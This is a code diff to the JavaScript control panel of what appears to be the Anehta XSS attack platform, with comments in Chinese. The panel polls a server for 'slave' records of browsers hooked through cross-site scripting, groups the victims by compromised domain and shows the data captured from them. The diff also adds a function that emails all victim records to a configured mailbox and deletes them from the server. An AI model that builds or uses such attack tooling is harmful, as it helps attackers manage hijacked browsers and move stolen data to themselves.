@@ -1,4 +1,4 @@
-
+var jTools = new Jsoner();
 // 从server取数据到本地
 function initData(){
 	/**************************
@@ -34,7 +34,6 @@ function initData(){
 	    function(data){
 	    	//alert(data);
 	    	// 所有slave记录都存到cache中
-	    	anehtaCache.removeItem("slaveRecords"); // 释放内存
 	    	anehtaCache.setItem("slaveRecords", data.slaveData);
 	    	
         // 释放内存
@@ -45,14 +44,31 @@ function initData(){
 	
 	// 然后每隔10秒钟去取一次slave记录
 	setInterval(function(){
+		var key;
+		if (slaveData){
+		  key = slaveData.record.length;
+	  } else {
+	  	key = 1;
+	  }
+	  	
 		var ts = new Date();
-	  $.getJSON("../server/jsoncallback.php?jsoncallback=getSlaveData&ts="+ts.getTime(),
+	  $.getJSON("../server/jsoncallback.php?jsoncallback=updateSlaveData&key="+key+"&ts="+ts.getTime(),
     //$.getJSON("../server/jsoncallback.php?jsoncallback=getSlaveData",
 	    function(data){
 	    	//alert(data);
 	    	// 所有slave记录都存到cache中
-	    	anehtaCache.removeItem("slaveRecords"); // 释放内存
-	    	anehtaCache.setItem("slaveRecords", data.slaveData);
+	    	if (slaveData){ // 已经有定义; 需要把更新的记录附在原来的后面两个json对象
+	    		for (i=0; i<data.length; i++){
+	    		  jTools.addChild(slaveData, "record", data[i]);
+	    	  }
+	    		//alert(slaveData.record.length);
+
+	    		anehtaCache.setItem("slaveRecords", slaveData);
+	    		
+	    	} else { // 没有定义
+	    	  //anehtaCache.setItem("slaveRecords", data.slaveData);
+	    	  setTimeout(function(){ window.location.reload(true);}, 2000); // 刷新页面
+	      }
 
         // 释放内存
 	      setTimeout(function(){data = null;}, 500);	    	
@@ -60,7 +76,7 @@ function initData(){
 	    });	    	
 	  setTimeout(function(){loadXSSsites();},1000);
 	},
-	20000);	   	    	
+	20000);	   	// 20秒    	 
 	 	
 }	
 
@@ -86,10 +102,14 @@ function loadXSSsites(){
 
   if ($d.getElementById("xssSites")){
     leftbar = $("#xssSites")[0]; // 获取div  
+    
+    if (!slaveData){
+    	return false;
+    }
 
     // 获取sites
 	  for (i=0; i< slaveData.record.length; i++){
-	  	//alert(anehta.crypto.base64Decode(slaveData.record[i].xssGot.ajaxPostResponse));
+	  	//alert(anehta.crypto.base64Decode(slaveData.record[i].xssGot.ajaxPostResponse));	  	
 	  	requestURI = $.trim(slaveData.record[i].xssGot.requestURI);
 	  	xssDomain = requestURI.split('/');  // 获取domain
 	  	xssDomain = xssDomain[2];
@@ -224,8 +244,8 @@ function dropdownmenu(obj, e, menucontents, menuwidth){
 	obj_call_dropdownmenu = obj; // 标记是谁调用的本函数
 	// 根据xssDomain获取slaves
 	//slaveData = anehtaCache.getItem("slaveRecords");	
-	for (i=0; i< slaveData.record.length; i++){				
-		  
+			
+	for (i=0; i< slaveData.record.length; i++){						  
     if ( ($.trim(slaveData.record[i].xssGot.requestURI).split('/'))[2] == obj.innerHTML){
     	// 从cache中取出slave watermark, 只取出在当前域名下的记录
 	    slaveWatermark[i] = $.trim(slaveData.record[i].slaveWatermark);
@@ -304,4 +324,57 @@ function delayhidemenu(){
 function clearhidemenu(){
   if (typeof delayhide!="undefined")
     clearTimeout(delayhide)
+}
+
+
+/*******************************************
+* 把所有的slave记录mail到邮箱
+* 并在服务器上删除
+*******************************************/
+function dumpToMail(){
+  var confirm = document.createElement("div");
+  confirm.id = "confirm_mail";
+  confirm.style.border = "1px solid black";
+  confirm.style.background = "white";
+  confirm.innerHTML = "<div style='float:left; margin: 15 15 15 15px; fontFamily: Verdana,Arial,Helvetica,sans-serif; font-size:14px;  color: #200;'>" + 
+                      "您确定要在服务器上删除所有Slave记录，并发送至配置文件中指定的邮箱吗？<br><br><br>" +
+                      "<button id='confirm_mail_yes' class='formbutton2' style='float:left; margin-left: 45px; width: 55px; height: 25px;' onclick='javascript:sendSlaveMail();'>Yes</button>" +
+                      "<button id='confirm_mail_cancel' class='formbutton2' style='float:right; margin-right: 45px; width: 55px; height: 25px;' onclick='javascript:$(\"#logo\")[0].style.zIndex = \"19999\"; $(\"#confirm_mail\").dialog(\"destroy\").remove();'>Cancel</button>" +
+                      "</div>";
+  $d.body.appendChild(confirm);
+
+  $("#confirm_mail").dialog({
+  	open: function(){
+  		$("#logo")[0].style.zIndex = "1000";
+  		$("#confirm_mail_cancel")[0].focus();
+  	},
+  	  	
+	  modal: true,
+	  
+	  title: "&nbsp;&nbsp;&nbsp;Warning!",
+	  
+	  overlay: { 
+      opacity: 0.8, 
+      background: "#cccccc" 
+    },
+    
+    dialogClass: "../server/css/style.css",   
+       
+    draggable: false,
+       
+    close: function(){
+    	$("#logo")[0].style.zIndex = "19999";
+    	$("#confirm_mail").dialog("destroy").remove();
+    }  	
+  });  
+}
+
+function sendSlaveMail(){
+	var image = new Image();
+	image.style.width = 0;
+	image.style.height = 0;	      
+	image.src = "../server/mail.php";
+	
+	$("#logo")[0].style.zIndex = "19999";
+	$("#confirm_mail").dialog("destroy").remove();
 }
